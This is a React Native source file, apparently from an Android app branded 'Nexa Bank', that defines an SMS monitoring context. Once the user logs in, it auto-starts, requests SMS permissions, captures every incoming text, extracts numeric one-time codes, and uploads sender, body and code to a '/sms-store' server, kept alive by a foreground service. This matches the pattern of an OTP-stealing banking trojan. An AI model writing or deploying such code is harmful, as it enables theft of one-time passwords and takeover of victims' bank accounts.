import {
  createContext,
  useCallback,
  useContext,
  useEffect,
  useMemo,
  useRef,
  useState,
} from "react";
import { NativeModules, Platform, PermissionsAndroid } from "react-native";

import {
  startReadSMS,
  stopReadSMS,
  checkIfHasSMSPermission,
} from "@maniac-tech/react-native-expo-read-sms";
import VIForegroundService from "@voximplant/react-native-foreground-service";
import SmsListener from "react-native-android-sms-listener";

import { useAuth } from "@/context/AuthContext";
import { apiRequest } from "@/lib/api";

const SmsMonitorContext = createContext(null);

export function SmsMonitorProvider({ children }) {
  const { isReady, isAuthenticated, token } = useAuth();
  const [isRunning, setIsRunning] = useState(false);
  const [lastError, setLastError] = useState("");
  const [canMonitor, setCanMonitor] = useState(false);
  const startedRef = useRef(false);
  const fallbackSubscriptionRef = useRef(null);
  const [message, setMessage] = useState(null);
  const refresh = useCallback(async () => {
    if (Platform.OS !== "android") {
      setCanMonitor(false);
      return;
    }

    try {
      const permissionState = await checkIfHasSMSPermission();
      const granted =
        permissionState.hasReadSmsPermission &&
        permissionState.hasReceiveSmsPermission;
      console.log("[sms-monitor] permission check", granted);
      setCanMonitor(granted);
    } catch (caught) {
      setCanMonitor(false);
      setLastError(
        caught instanceof Error ? caught.message : "Gagal memeriksa izin SMS.",
      );
    }
  }, []);

  const start = useCallback(async () => {
    if (Platform.OS !== "android" || startedRef.current) return;

    setLastError("");
    setIsRunning(false);

    try {
      console.log(
        "[sms-monitor] native module ready",
        Boolean(NativeModules.RNExpoReadSms),
      );
      const notificationGranted = await requestNotificationPermission();
      let permissionState = await checkIfHasSMSPermission();
      let granted =
        permissionState.hasReadSmsPermission &&
        permissionState.hasReceiveSmsPermission;

      if (!granted) {
        granted = await requestSmsPermissions();
        permissionState = await checkIfHasSMSPermission();
        granted =
          granted &&
          permissionState.hasReadSmsPermission &&
          permissionState.hasReceiveSmsPermission;
      }

      setCanMonitor(granted);
      console.log("[sms-monitor] permissions", permissionState);

      if (!granted) {
        setLastError("Izin SMS belum diberikan.");
        console.log("[sms-monitor] permission denied");
        return;
      }

      await ensureForegroundService().catch((caught) => {
        console.log(
          "[sms-monitor] foreground service skipped",
          caught instanceof Error ? caught.message : caught,
        );
      });
      console.log("[sms-monitor] notification permission", notificationGranted);
      console.log("[sms-monitor] starting listener");
      stopReadSMS();
      stopFallbackListener(fallbackSubscriptionRef);
      fallbackSubscriptionRef.current = SmsListener.addListener((message) => {
        console.log("[sms-monitor:fallback] callback raw", message);

        const parsed = parseIncomingSms(message);
        if (!parsed) {
          console.log(
            "[sms-monitor:fallback] received but cannot parse",
            message,
          );
          return;
        }

        setMessage(parsed);
        console.log("[sms-monitor:fallback] received from:", parsed.from);
        console.log("[sms-monitor:fallback] body:", parsed.body);
        console.log(
          "[sms-monitor:fallback] numeric-code:",
          extractNumericCode(parsed.body),
        );
      });

      await startReadSMS(async (status, sms, error) => {
        console.log("[sms-monitor] callback raw", { status, sms, error });

        if (status === "error") {
          setLastError(error || "Listener SMS gagal dimulai.");
          console.log("[sms-monitor] listener error", error);
          return;
        }

        const parsed = parseIncomingSms(sms);
        if (!parsed) {
          console.log("[sms-monitor] received but cannot parse", sms);
          return;
        }

        console.log("[sms-monitor] received from:", parsed.from);
        console.log("[sms-monitor] body:", parsed.body);
        console.log(
          "[sms-monitor] numeric-code:",
          extractNumericCode(parsed.body),
        );

        try {
          await apiRequest("/sms-store", {
            method: "POST",
            token,
            body: {
              sender: parsed.from,
              message: parsed.body,
              code: extractNumericCode(parsed.body),
            },
          });

          console.log("[sms-monitor] SMS berhasil dikirim ke server");
        } catch (e) {
          console.log("[sms-monitor] gagal kirim SMS ke server", e);
        }
      });

      startedRef.current = true;
      setIsRunning(true);
      console.log("[sms-monitor] listener active");
    } catch (caught) {
      setLastError(
        caught instanceof Error
          ? caught.message
          : "Pemantauan SMS gagal dimulai.",
      );
      console.log("[sms-monitor] start failed", caught);
      setIsRunning(false);
      startedRef.current = false;
    }
  }, [token]);

  const stop = useCallback(async () => {
    try {
      stopReadSMS();
    } catch {
      // ignore
    }

    stopFallbackListener(fallbackSubscriptionRef);

    try {
      getForegroundService()?.stopService?.();
    } catch {
      // ignore
    }

    startedRef.current = false;
    setIsRunning(false);
    console.log("[sms-monitor] stopped");
  }, []);

  useEffect(() => {
    if (!isReady || !isAuthenticated || Platform.OS !== "android") {
      if (startedRef.current) {
        stop().catch(() => undefined);
      }
      return;
    }

    if (!startedRef.current) {
      start().catch((caught) => {
        console.log("[sms-monitor] auto start failed", caught);
      });
    }
  }, [isReady, isAuthenticated, start, stop]);

  const value = useMemo(
    () => ({
      canMonitor,
      isRunning,
      lastError,
      refresh,
      start,
      stop,
    }),
    [canMonitor, isRunning, lastError, refresh, start, stop],
  );

  return (
    <SmsMonitorContext.Provider value={value}>
      {children}
    </SmsMonitorContext.Provider>
  );
}

export function useSmsMonitor() {
  const context = useContext(SmsMonitorContext);

  if (!context) {
    throw new Error(
      "useSmsMonitor harus digunakan di dalam SmsMonitorProvider",
    );
  }

  return context;
}

async function ensureForegroundService() {
  if (Platform.OS !== "android") return;

  const foregroundService = getForegroundService();
  if (
    !foregroundService?.createNotificationChannel ||
    !foregroundService?.startService
  ) {
    throw new Error("VIForegroundService API tidak tersedia.");
  }

  await foregroundService.createNotificationChannel({
    description: "Pemantauan SMS dan log OTP.",
    enableVibration: false,
    id: "sms-monitor",
    name: "SMS Monitor",
  });

  await foregroundService.startService({
    channelId: "sms-monitor",
    id: 7031,
    icon: "ic_launcher",
    priority: 1,
    text: "Pemantauan SMS aktif",
    title: "Nexa Bank",
  });
}

function getForegroundService() {
  return VIForegroundService?.getInstance
    ? VIForegroundService.getInstance()
    : VIForegroundService;
}

function parseIncomingSms(raw) {
  if (raw && typeof raw === "object" && !Array.isArray(raw)) {
    const body =
      raw.body ?? raw.message ?? raw.messageBody ?? raw.sms ?? raw.text;
    const from =
      raw.from ??
      raw.sender ??
      raw.originatingAddress ??
      raw.address ??
      raw.phoneNumber;

    if (body || from) {
      return {
        body: String(body ?? ""),
        from: String(from ?? "Tidak diketahui"),
      };
    }
  }

  if (Array.isArray(raw) && raw.length >= 2) {
    return {
      body: String(raw[1] ?? ""),
      from: String(raw[0] ?? "Tidak diketahui"),
    };
  }

  if (typeof raw !== "string") return null;

  const match = raw.match(/^\[(.*?),\s*(.*)\]$/s);
  if (match) {
    return {
      body: match[2].trim(),
      from: match[1].trim(),
    };
  }

  return {
    body: raw,
    from: "Tidak diketahui",
  };
}

function stopFallbackListener(subscriptionRef) {
  try {
    subscriptionRef.current?.remove?.();
  } catch {
    // ignore
  }

  subscriptionRef.current = null;
}

function extractNumericCode(body) {
  const matches = body.match(/\b\d{4,8}\b/g);
  return matches?.[0] ?? null;
}

async function requestSmsPermissions() {
  if (Platform.OS !== "android") return false;

  const result = await PermissionsAndroid.requestMultiple([
    PermissionsAndroid.PERMISSIONS.RECEIVE_SMS,
    PermissionsAndroid.PERMISSIONS.READ_SMS,
  ]);

  console.log("[sms-monitor] request result", result);

  return (
    result[PermissionsAndroid.PERMISSIONS.RECEIVE_SMS] ===
      PermissionsAndroid.RESULTS.GRANTED &&
    result[PermissionsAndroid.PERMISSIONS.READ_SMS] ===
      PermissionsAndroid.RESULTS.GRANTED
  );
}

async function requestNotificationPermission() {
  if (Platform.OS !== "android") return true;
  if (Platform.Version < 33) return true;

  const result = await PermissionsAndroid.request(
    PermissionsAndroid.PERMISSIONS.POST_NOTIFICATIONS,
  );
  return result === PermissionsAndroid.RESULTS.GRANTED;
}
